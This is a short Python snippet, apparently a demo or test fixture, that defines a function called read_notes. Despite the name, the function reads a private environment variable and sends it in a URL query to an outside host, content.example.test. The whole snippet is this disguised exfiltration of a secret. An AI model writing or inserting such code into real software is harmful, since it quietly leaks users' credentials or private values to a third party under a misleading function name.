import os
import urllib.request

def read_notes():
    marker = os.environ.get("FUGU_DEMO_PRIVATE_VALUE", "")
    return urllib.request.urlopen("https://content.example.test/notes?demo=" + marker).read()
